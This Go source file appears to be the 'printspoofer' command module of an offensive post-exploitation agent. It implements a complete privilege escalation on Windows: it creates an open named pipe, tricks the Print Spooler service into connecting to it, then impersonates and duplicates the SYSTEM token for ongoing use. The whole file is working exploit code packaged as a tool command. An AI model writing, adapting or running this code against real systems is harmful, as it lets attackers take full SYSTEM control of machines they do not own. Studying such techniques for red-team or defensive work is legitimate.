//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PrintSpooferCommand implements the PrintSpoofer privilege escalation technique.
// Exploits SeImpersonatePrivilege by creating a named pipe and triggering the
// Print Spooler service (SYSTEM) to connect to it, then impersonating the token.
// Works from NETWORK SERVICE, LOCAL SERVICE, or any context with SeImpersonate.
type PrintSpooferCommand struct{}

func (c *PrintSpooferCommand) Name() string { return "printspoofer" }
func (c *PrintSpooferCommand) Description() string {
	return "PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler"
}

type printSpooferArgs struct {
	Timeout int `json:"timeout"`
}

var (
	winspoolDrv      = windows.NewLazySystemDLL("winspool.drv")
	procOpenPrinterW = winspoolDrv.NewProc("OpenPrinterW")
	procClosePrinter = winspoolDrv.NewProc("ClosePrinter")
)

func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
	var args printSpooferArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}
	if args.Timeout == 0 {
		args.Timeout = 15
	}

	// Check SeImpersonatePrivilege first
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Get computer name for the printer path
	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
	compNameSize := uint32(len(compNameBuf))
	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("GetComputerName failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])

	// Generate a random pipe name suffix
	var randBuf [8]byte
	windows.GetSystemTimeAsFileTime((*windows.Filetime)(unsafe.Pointer(&randBuf)))
	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])

	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
	// The spooler appends \pipe\spoolss to the server path, so we create a pipe
	// matching that pattern.
	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)

	// Create security descriptor allowing Everyone to connect
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor failed: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("UTF16 conversion failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create pipe with FILE_FLAG_OVERLAPPED for async ConnectNamedPipe
	hPipe, _, createErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipe failed for %s: %v", pipePath, createErr),
			Status:    "error",
			Completed: true,
		}
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Start async ConnectNamedPipe with OVERLAPPED
	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, non-signaled
	if eventErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(event)

	var overlapped windows.Overlapped
	overlapped.HEvent = event

	ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
	if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
			Status:    "error",
			Completed: true,
		}
	}

	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED

	if !alreadyConnected {
		// Trigger the Print Spooler to connect to our pipe.
		// OpenPrinterW("\\COMPUTERNAME/pipe/{suffix}") causes the spooler to
		// connect to \\COMPUTERNAME\pipe\{suffix}\pipe\spoolss = our pipe.
		// The forward slash in /pipe/ is key — it's interpreted as path separator.
		printerName := fmt.Sprintf(`\\%s/pipe/%s`, computerName, pipeSuffix)
		triggerErr := triggerSpooler(printerName)
		if triggerErr != nil {
			windows.CancelIoEx(pipeHandle, &overlapped)
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to trigger Print Spooler: %v\nIs the Print Spooler service running? Check: sc query spooler", triggerErr),
				Status:    "error",
				Completed: true,
			}
		}

		// Wait for spooler to connect (with timeout)
		timeoutMs := uint32(args.Timeout * 1000)
		waitResult, _ := windows.WaitForSingleObject(event, timeoutMs)
		switch waitResult {
		case windows.WAIT_OBJECT_0:
			// Connected!
		case 258: // WAIT_TIMEOUT
			windows.CancelIoEx(pipeHandle, &overlapped)
			return structs.CommandResult{
				Output:    fmt.Sprintf("Timeout after %ds — Print Spooler did not connect to %s.\nPossible causes:\n- Print Spooler not running (sc query spooler)\n- Pipe name collision\n- The service may not have access", args.Timeout, pipePath),
				Status:    "error",
				Completed: true,
			}
		default:
			windows.CancelIoEx(pipeHandle, &overlapped)
			return structs.CommandResult{
				Output:    fmt.Sprintf("WaitForSingleObject failed: result=%d", waitResult),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Spooler connected — impersonate the SYSTEM token
	impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if impRet == 0 {
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v", impErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the impersonated identity
	clientIdentity, _ := GetCurrentIdentity()
	if clientIdentity == "" {
		clientIdentity = "unknown"
	}

	// Capture the thread impersonation token
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}
	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to a primary token for persistent use
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(
		threadToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		err = windows.DuplicateTokenEx(
			threadToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&dupToken,
		)
	}
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Clean up impersonation and pipe
	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	// Store in global identity system
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		windows.CloseHandle(windows.Handle(dupToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
	sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
	sb.WriteString("Use 'whoami' to verify current context.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// triggerSpooler calls OpenPrinterW with a crafted path that causes the
// Print Spooler service to connect to our named pipe as SYSTEM.
func triggerSpooler(printerName string) error {
	namePtr, err := windows.UTF16PtrFromString(printerName)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	var hPrinter uintptr
	ret, _, callErr := procOpenPrinterW.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&hPrinter)),
		0, // pDefault = NULL
	)

	// OpenPrinterW may fail with an error (the printer doesn't actually exist),
	// but the important thing is that the spooler TRIED to connect to the pipe.
	// The authentication/connection happens before the error is returned.
	if ret != 0 && hPrinter != 0 {
		procClosePrinter.Call(hPrinter)
	}

	// If the call completely failed (not just printer not found), report it
	if ret == 0 && callErr != nil {
		// ERROR_INVALID_PRINTER_NAME (1801) is expected — the "printer" doesn't exist
		// but the spooler still tried to connect to the pipe endpoint
		if callErr == windows.Errno(1801) {
			return nil // Expected — spooler tried to connect, that's all we need
		}
		return fmt.Errorf("OpenPrinterW: %v", callErr)
	}

	return nil
}
